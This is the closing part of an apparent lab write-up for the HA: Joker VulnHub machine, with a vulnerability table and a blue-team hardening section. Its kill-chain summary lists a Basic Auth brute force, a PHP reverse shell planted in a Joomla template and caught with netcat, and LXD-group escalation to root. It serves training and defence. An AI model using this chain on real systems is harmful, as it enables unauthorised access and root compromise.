| # | Vulnerability | Where | Impact | Fix |
| --- | --- | --- | --- | --- |
| 1 | **Hint file exposed on the web root** | `/secret.txt` | Told the attacker the exact wordlist and its size — turned a 14M-word problem into 100 tries | Never place notes, TODOs or credentials in the document root; add `*.txt` to content-discovery runs of your own site |
| 2 | **HTTP Basic Auth over cleartext** | `:8080`, `WWW-Authenticate: Basic realm="Restricted"` | Credential is base64 (i.e. readable) on every request; trivially brute-forced | Use HTTPS; prefer form auth with rate limiting, lockout and MFA |
| 3 | **Weak, common password** | `joker:hannah` | Broken in ~2 s from a 100-word list | Password policy + breach-list checking at set-time (`hibpwned`, `pwquality`) |
| 4 | **No rate limiting / lockout on auth** | `:8080` | 100 unlimited attempts | `fail2ban`, Apache `mod_evasive`, or an authenticating reverse proxy |
| 5 | **CMS template editing enabled** | Joomla → Extensions → Templates → `beez3/index.php` | Any Super User = RCE as `www-data` | Disable in-browser editing; restrict template administration to break-glass accounts |
| 6 | **`www-data` in the `lxd` group** | `/etc/group` | **Direct, unauthenticated-by-design root** — privileged container + host `/` mount | Remove the service account from `lxd`/`docker`/`libvirt`. These groups are root-equivalent. |
| 7 | **Database password in `configuration.php`** | web root | Lateral movement, credential reuse | Least-privilege DB user; separate secrets store |

### The kill chain in one line

```text
nmap -A -p- → 22 ssh, 80 http (Joker quotes), 8080 http (401 Basic realm="Restricted")
  → dirb -X .txt → /secret.txt
  → read the hint: "the rock… top of the pile… first hundred"
  → head -n 100 rockyou.txt > dict.txt
  → Burp Intruder (Sniper) on the base64 Authorization value  [or hydra -s 8080 http-get]
  → 200 OK on am9rZXI6aGFubmFo → base64 -d → joker:hannah
  → Joomla CMS confirmed via <meta name="generator">
  → Extensions → Templates → beez3 → index.php → paste php-reverse-shell.php
  → Template Preview / curl → nc -lvnp 4444 → www-data
  → id → groups=33(www-data),110(lxd)   <=== the win
  → Kali: git clone lxd-alpine-builder && sudo ./build-alpine
  → wget the tarball → lxc image import --alias myimage
  → lxc init myimage ignite -c security.privileged=true
  → lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
  → lxc start ignite && lxc exec ignite /bin/sh
  → cat /mnt/root/root/final.txt
```

---

## 9. Defensive lessons (blue team)

### The single most important lesson

**`lxd`, `docker`, `libvirt` and `disk` group memberships are root.** There is no
nuance here. A user in one of those groups can mount the host filesystem or run
a privileged container, and from there it is a one-line `echo >> /etc/passwd`.

Audit it today on every server you own:

```bash
# Who can trivially become root?
getent group lxd docker libvirt disk sudo wheel | tr ',' '\n'
```

```text
lxd:x:110:www-data
docker:x:999:
libvirt:x:111:
disk:x:6:
sudo:x:27:raj
```

If a **service account** such as `www-data` appears in that output, remove it:

```bash
sudo gpasswd -d www-data lxd
```

### Hardening checklist

1. **Never add a web-server user to a container group.** If an application
   genuinely needs to launch containers, give it a scoped API token with a
   restricted LXD project — not group membership.
2. **Move Basic Auth behind TLS.** `htpasswd` files over HTTP leak the
   credential in every request. If you must use Basic Auth, terminate TLS first
   and enable `mod_evasive`/`fail2ban` for rate limiting.
3. **Detect the brute force.** A burst of `401`s followed by one `200` on the
   same client IP is the signature. Alert on it:

   ```text
   # Apache: count 401s per client per minute
   awk '$9==401 {print $1}' access.log | sort | uniq -c | sort -rn | head
   ```

4. **Remove stray files from the document root.** `secret.txt`, `notes.txt`,
   `backup.zip`, `db.sql`, `.bak`, `~` files. Run your own
   `gobuster -x txt,zip,bak,sql,old` monthly against production.
5. **Disable in-browser template/theme editing** in every CMS:
   - Joomla: restrict *Extensions → Templates* to break-glass admins.
   - WordPress: `define('DISALLOW_FILE_EDIT', true);`
6. **Watch for LXD abuse.** These commands are extremely loud if you audit them:

   ```text
   lxc image import … --alias …
   lxc init … -c security.privileged=true
   lxc config device add … disk source=/ …
   ```

   An `auditd` rule on `execve` of `/usr/bin/lxc` will catch the entire chain.
7. **File-integrity monitoring on `/etc/passwd`.** AIDE or Tripwire flags the
   appended UID-0 line the moment it is written.
8. **Container escape detection.** A process inside a container whose
   `/proc/1/cgroup` differs from the host, reading `/mnt/root/etc/shadow`, is
   unambiguous. EDR should alert on any new mount of `/` inside a container
   namespace.

---

## 10. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/ha-joker,379/>
- Official walkthrough (Hacking Articles): <https://www.hackingarticles.in/ha-joker-vulnhub-walkthrough/>
- Anushibin John Joseph, "HA: Rudra — Walkthrough" (same author's HA series style): <https://anushibin.wordpress.com/>
- Deskel, "THM write-up: HA Joker CTF" (TryHackMe re-release of this VM — corroborates `joker:hannah` and the LXD chain): <https://deskel.github.io/posts/thm/ha-joker-ctf>
- shuzhiduo mirror of the HA Joker walkthrough (independent corroboration of the exact `lxc` command sequence): <https://www.shuzhiduo.com/A/KE5Q36PqzL/>
- `lxd-alpine-builder`: <https://github.com/saghul/lxd-alpine-builder>
- LXD security / privileged containers: <https://documentation.ubuntu.com/lxd/en/latest/security/>
- GTFOBins & privilege-escalation reference: <https://gtfobins.github.io/>
- HackTricks — "Privilege Escalation: LXD/Docker group": <https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation>
- Joomla `configuration.php` reference: <https://docs.joomla.org/Configuring_a_Joomla!_website>
- Repository guides: [`docs/TOOLS.md`](../../docs/TOOLS.md) · [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) · [`docs/BEGINNER-PATH.md`](../../docs/BEGINNER-PATH.md)

---

## 11. Screenshot checklist

Screenshots go in [`images/`](images/) beside this file:

| # | File | Section | What it must show |
| --- | --- | --- | --- |
| 01 | `01-netdiscover.png` | 1 | `netdiscover`/`arp-scan` with the target IP + MAC |
| 02 | `02-nmap.png` | 2.1 | `nmap -A -p-`: ports 22/80/8080, and the `http-auth … Basic realm=Restricted` line |
| 03 | `03-secret-txt.png` | 2.4 | `dirb -X .txt` finding `/secret.txt`, then `cat secret.txt` |
| 04 | `04-burp-intruder.png` | 4.1 | Burp Intruder results: 99 × `401` and one `200` (highlight it) |
| 05 | `05-joomla.png` | 4.4 | The authenticated Joomla front page |
| 06 | `06-shell.png` | 5.3–5.4 | `nc -lvnp 4444` catching the shell, then `id` → `www-data` |
| 07 | `07-lxd-group.png` | 6.1 | `id` showing `110(lxd)` — **the key screenshot of this box** |
| 08 | `08-root-flag.png` | 6.5 | `lxc exec ignite /bin/sh` then `cat /mnt/root/root/final.txt` |

> **How to capture on Kali:** `flameshot gui` or `gnome-screenshot -a`. Save as
> PNG with the exact filenames above so the inline links resolve.
>
> **Redact before publishing:** Burp's Intruder window will show your target IP
> and the recovered password — fine for a lab writeup, but blur anything from a
> real engagement.

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
